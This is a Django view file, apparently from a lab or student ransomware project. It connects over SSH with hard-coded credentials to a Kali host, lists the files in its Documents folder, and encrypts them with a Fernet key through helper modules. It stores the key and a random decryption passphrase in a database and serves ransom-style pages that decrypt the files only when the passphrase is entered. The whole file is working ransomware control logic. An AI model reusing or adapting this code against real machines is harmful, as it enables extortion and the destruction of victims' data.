from django.shortcuts import render
from exeapp.forms import MyForm
from cryptography.fernet import Fernet
import os
from exeapp.models import AttackData
import socket
import random
import paramiko
from exeapp import decryptionfile, encryptionfile
from exeapp.SSH_Paramiko import ssh_connector


Org_file_list=[]

hostname = "172.16.208.131"
port = 22  
username = "kali"
password = "kali"

try:
    # Connect to the remote server

    ssh = ssh_connector(hostname,port,username,password)
    
    #Sending Commands to remote server

    commands = ["pwd","find /home/kali/Documents -type f ! -name '*.lazarus'"]
    stdin, stdout, stderr = ssh.exec_command(commands[0])
    curr_dir = stdout.read().decode('utf-8')
    # print(username)
    remote_dir = os.path.join(curr_dir.strip(),'Documents')
    stdin, stdout, stderr = ssh.exec_command(commands[1])
    Org_file_list = stdout.read().decode().splitlines()
    print(Org_file_list)


   

    def popup_view(request):

        if request.method == 'POST':
            form = MyForm(request.POST)
            if form.is_valid():
                if AttackData.objects.get(SystemName=hostname).DecryptionPassword == form.cleaned_data['User_Entry_Password']:
                    
                    key = AttackData.objects.get(SystemName=hostname).EncryptionKey
                    decryptionfile.decryption(key,Org_file_list,hostname,port,username,password)
                    
                    return render(request , 'ransomware.html')

        
        key = Fernet.generate_key()
        filesize=encryptionfile.encryption(Org_file_list,key,hostname,port,username,password)
        
        form = MyForm()
        form.fields['System_Name'].widget.attrs['value'] = hostname


        if AttackData.objects.filter(SystemName = hostname).first():
            
            entry = AttackData.objects.get(SystemName=hostname)

            # Increment the integer fields
            entry.NumberOfFiles = entry.NumberOfFiles + len(Org_file_list)
            entry.TotalFilesSize = entry.TotalFilesSize + int(filesize)
            entry.save()
            form.fields['Number_Of_Files_Encrypted'].widget.attrs['value'] = entry.NumberOfFiles
            form.fields['Volume_Of_Files'].widget.attrs['value'] = str(entry.TotalFilesSize) + 'bytes'
        
        else:
            with open('exeapp/words.txt', 'r') as file:
                phrases = [line.strip() for line in file]
                random_phrase = f"{random.choice(phrases)} {random.choice(phrases)} {random.choice(phrases)}."

                print(random_phrase)
            AttackData.objects.create(SystemName = hostname,NumberOfFiles = len(Org_file_list),TotalFilesSize = filesize,EncryptionKey = key, DecryptionPassword = random_phrase)
            form.fields['Number_Of_Files_Encrypted'].widget.attrs['value'] = len(Org_file_list) 
            form.fields['Volume_Of_Files'].widget.attrs['value'] = str(filesize) + 'bytes'
    

        return render(request,'ransomware1.html',{'form': form})

except paramiko.AuthenticationException as e:
    print("Authentication failed:", str(e))
except paramiko.SSHException as e:
    print("SSH connection failed:", str(e))
except Exception as e:
    print("An error occurred:", str(e))
finally:
    # Close the SSH connection
    ssh.close()
